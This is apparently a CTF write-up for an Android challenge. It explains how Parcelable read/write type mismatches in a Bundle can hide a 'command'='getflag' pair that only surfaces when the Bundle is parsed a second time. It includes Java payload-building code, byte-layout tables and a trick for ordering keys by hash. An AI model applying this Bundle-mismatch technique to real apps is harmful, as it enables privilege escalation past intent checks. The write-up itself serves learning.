# BroadcastTest
## background
We can reverse the apk and find it only have 4 classes: `MainActivity$Message` and `Receiver`1-3.

and `MainActivity$Message` implement from Parcelable class.

`Receiver1` is expoted. It receive global broadcast and send the bundle to `Receiver2`.

`Receiver2` and `Recevier3` isn't expoted, so they can only receive broadcasts from this apk.

The procedure is 

1. `Receiver1` receive the data from broadcast, and decode it by base64, then marshall it to a bundle, and send it as a broadcast to `Receiver2`.
2. `Receiver2` check the "command", assert value != 'getflag', then send it to `Receiver3`.
3. `Receiver3` check the "command", assert value == 'getflag.

I search the parcel and bundle then find [this article](https://www.ms509.com/2018/07/03/bundle-mismatch) and CVE-2017-13288.

## theory
Android can marshal a object by implementing from Parceable.
The class must implement `writeToParcel` and `readFromParcel` method to describe how to marshal and unmarshal.
Parcelable object need to be taken by Bundle, which is a hashmap.
Bundle can be put key-value by `PutExtra(key, value)`. The type of value can be int, Boolean, String or Parcelable object etc. 

``` Java
// Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.
    private static final int VAL_NULL = -1;
    private static final int VAL_STRING = 0;
    private static final int VAL_INTEGER = 1;
    private static final int VAL_MAP = 2;
    private static final int VAL_BUNDLE = 3;
    private static final int VAL_PARCELABLE = 4;
    private static final int VAL_SHORT = 5;
    private static final int VAL_LONG = 6;
    private static final int VAL_FLOAT = 7;
```

It will write len of total, magic number, and key-value pairs. 
From `BaseBundle.writeToParcelInner`:
```java
int lengthPos = parcel.dataPosition();
parcel.writeInt(-1); // dummy, will hold length
parcel.writeInt(BUNDLE_MAGIC);
int startPos = parcel.dataPosition();
parcel.writeArrayMapInternal(map);
int endPos = parcel.dataPosition();
// Backpatch length
parcel.setDataPosition(lengthPos);
int length = endPos - startPos;
parcel.writeInt(length);
parcel.setDataPosition(endPos);
```

`pacel.writeArrayMapInternal` will write the number of hashmap, then key and value.
```java
/**
   * Flatten an ArrayMap into the parcel at the current dataPosition(),
   * growing dataCapacity() if needed.  The Map keys must be String objects.
   */
  /* package */ void writeArrayMapInternal(ArrayMap<String, Object> val) {
...
      final int N = val.size();
      writeInt(N);
     ... 
      int startPos;
      for (int i=0; i<N; i++) {
          if (DEBUG_ARRAY_MAP) startPos = dataPosition();
          writeString(val.keyAt(i));
          writeValue(val.valueAt(i));
...
```

`writeValue` will write the type and value. If the type is Parceable, writing will call `writeParcelable` method, which call `writeToParcel` in `Parcelable` object.
```java
public final void writeValue(Object v) {
        if (v == null) {
            writeInt(VAL_NULL);
        } else if (v instanceof String) {
            writeInt(VAL_STRING);
            writeString((String) v);
        } else if (v instanceof Integer) {
            writeInt(VAL_INTEGER);
            writeInt((Integer) v);
        } else if (v instanceof Map) {
            writeInt(VAL_MAP);
            writeMap((Map) v);
        } else if (v instanceof Bundle) {
            // Must be before Parcelable
            writeInt(VAL_BUNDLE);
            writeBundle((Bundle) v);
        } else if (v instanceof PersistableBundle) {
            writeInt(VAL_PERSISTABLEBUNDLE);
            writePersistableBundle((PersistableBundle) v);
        } else if (v instanceof Parcelable) {
            // IMPOTANT: cases for classes that implement Parcelable must
            // come before the Parcelable case, so that their specific VAL_*
            // types will be written.
            writeInt(VAL_PARCELABLE);
            writeParcelable((Parcelable) v, 0);
```

We can use this code to get the bytes from marshal.
```java
Bundle bundle = new Bundle();
bundle.putParcelable(AccountManager.KEY_INTENT, new MainActivity$Message()));
byte[] bs = {'a', 'a','a', 'a'};
bundle.putByteArray("AAA", bs);
Parcel testData = Parcel.obtain();
bundle.writeToParcel(testData, 0);
byte[] raw = testData.marshall();
```
![](./1.png)

`writeString`will put '\0' to the end of string. 
PAD_SIZE will make the length of unit be the multipiles of 4.

## Exploit
`MainActivity$Message` is a class implementing from `Parceable`.
There are two type-difference:
1. 
```
this.txRate = in.readInt();
dest.writeByte((byte) this.txRate);
```
2. 
```
this.rttSpread = in.readLong();
dest.writeInt((int) this.rttSpread);
```

Through test I found that the first type-difference which in byte and int will not create influence, because of PAD_SIZE.
So the second type-difference will cover 4 bytes after `Message` object every times `readFromParcel` and `writeToParcel`.

The intent of this challenge is to hide a key-value pair `'command'='getflag'`, and expoes it when second reading.

The order of bundle is 'length of key, content of key, type of value, length of value, content of value'.

It means that the writing will cover `length of key` and make the first 4 bytes of origin `content of key` the new `length of key`.

So we can construct this payload:

```
Message|len_key|content_key|type_value|len_value|content_value|
--|--|--|--|--|--|
pad|15 00 00 00|07 00 00 00 "command" 00 00 00 00 00 00 07 00 00 00 "getflag" 00 00| 00 00 00 00|03 00 00 00| "pad" |
pad 15 00 00 00|07 00 00 00| "command" 00 00|00 00 00 00|07 00 00 00|"getflag" 00 00
```

The format of string is UTF-16, two bytes every char.
type=0 means `VAL_STRING`.

Another need to do is that `Receiver2` need `bundle.getString("command")!=null`, so we need another key-value pair `'command'='xxx'`.


So one of the payloads is:
```java
        Parcel a = Parcel.obtain();
        Parcel b = Parcel.obtain();
        a.writeInt(3);//Count
        a.writeString("mismatch");
        a.writeInt(4);//Parcable
        a.writeString("com.de1ta.broadcasttest.MainActivity$Message");
        a.writeString("bssid");
        a.writeInt(1);
        a.writeInt(2);
        a.writeInt(3);
        a.writeInt(4);
        a.writeInt(5);
        a.writeInt(6);
        a.writeInt(7);
        a.writeLong(8);
        a.writeInt(9);
        a.writeInt(10);
        a.writeInt(-1);
        a.writeLong(11);
        a.writeLong(12);
        a.writeLong(0x11223344);
        // fake map
        // \7\0 => hide_len_key
        // command\0 => hide_content_key
        // \0\0 => hide_type_value
        // \7\0 => hide_len_value
        // getflag\0 => hide_content_value
        a.writeString("\7\0command\0\0\0\7\0getflag");
        a.writeInt(0);//fake_type
        a.writeString("");//fake_value
        a.writeString("command");//for bundle.getString("command")!=null
        a.writeInt(0);
        a.writeString("gotflag");
        int len = a.dataSize();
        b.writeInt(len);
        b.writeInt(0x4c444E42);
        b.appendFrom(a, 0, len);
        b.setDataPosition(0);

        byte[] raw = b.marshall();
        String output = Base64.encodeToString(raw, 0);
        Log.i("test", output);
```

## Other
I use this payload1 in match:
``` java
a.writeString("\7\0command\0\0\0\7\0getflag\0");
a.writeInt(0);//fake_type
a.writeString("1");//fake_value
```
But marshaling shows that fake_key contains 3 zero char after 'getflag'. It costs 6 bytes.
I search it and find that `writeString` method will put '\0' to the end of string, then pad size.

But if I remove the zero, `writeString("\7\0command\0\0\0\7\0getflag")`, the end zero will be at the end. It costs 44 bytes without padding.
The structure is 
```
Message|len_key|content_key|type_value|len_value|content_value|len_key2|content_key2|type_value2|len_value2|content_value2|
--|--|--|--|--|--|--|--|--|--|--|
pad|15 00 00 00|07 00 00 00 "command" 00 00 00 00 00 00 07 00 00 00 "getflag" 00 00| 00 00 00 00|01 00 00 00| "1" | 07 00 00 00 | "command" | 00 00 00 00| 00 00 00 00 | null
pad 15 00 00 00|07 00 00 00| "command" 00 00|00 00 00 00|07 00 00 00|"getflag" 00 00 | 00 00 00 00 | 01 00 00 00 | "1" | 07 00 00 00 | "command"
```

We can find the `type_value2` is error.
So we need to construct `fake_value1=""`.

```
Message|len_key|content_key|type_value|len_value|content_value|len_key2|content_key2|type_value2|len_value2|content_value2|
--|--|--|--|--|--|--|--|--|--|--|
pad|15 00 00 00|07 00 00 00 "command" 00 00 00 00 00 00 07 00 00 00 "getflag" 00 00| 00 00 00 00|00 00 00 00| 00 00 00 00 | 07 00 00 00 | "command" | 00 00 00 00| 00 00 00 00 | null
pad 15 00 00 00|07 00 00 00| "command" 00 00|00 00 00 00|07 00 00 00|"getflag" 00 00 | 00 00 00 00 | 00 00 00 00 | 00 00 00 00 | 07 00 00 00 | "command"
```

This is the payload2:
```java 
a.writeString("\7\0command\0\0\0\7\0getflag");
a.writeInt(0);//fake_type
a.writeString("");//fake_value
```


For validating my suppose, I use payload3:
``` java
a.writeString("\7\0command\0\0\0\7\0getflag\0\0");
a.writeInt(0);//fake_type
a.writeString("1");//fake_value
```
The bundle created by this payload should be the same as the bundle created by payload1 except `length`.
Yes, it is.
But `Receiver3` refuse the bundle and raise a exception.
I check it and find the order changed:
`'\7\0command...getflag\0\0'='1', Message, 'command'='gotflag'`
It means that the payload is correct but it covered `'command'='gotflag'`.

And there is a warning in logcat:
```
>>W/ArrayMap: New hash -1841832101 is before end of array hash -1212575282 at index 1 key ��command��������getflag����
```

So the question is Bundle use Arraymap, whose order is decisided by hash of key.
We change the key, so the hash changed.
It is lower than the hash of key of Message.
We don't care it before.
Here is the source:

```java
    public void append(K key, V value) {
        int index = mSize;
        final int hash = key == null ? 0
                : (mIdentityHashCode ? System.identityHashCode(key) : key.hashCode());
        if (index >= mHashes.length) {
            throw new IllegalStateException("Array is full");
        }
        if (index > 0 && mHashes[index-1] > hash) {
            RuntimeException e = new RuntimeException("here");
            e.fillInStackTrace();
            Log.w(TAG, "New hash " + hash
                    + " is before end of array hash " + mHashes[index-1]
                    + " at index " + index + " key " + key, e);
            put(key, value);
            return;
        }
```

So I think pwn the vulnerability, the value of hash is important.
The value of hash of key is `-1841832101`, so we just need to find a key with lower hash.
``` java
        String key = "mismatch";
        while(key.hashCode()>=-1841832101){
            key += ".";
        }
        a.writeString(key); // key of Message object

```

[This](./gen_payload.zip) is a project of AndroidStudio which can generate the exploit payload.
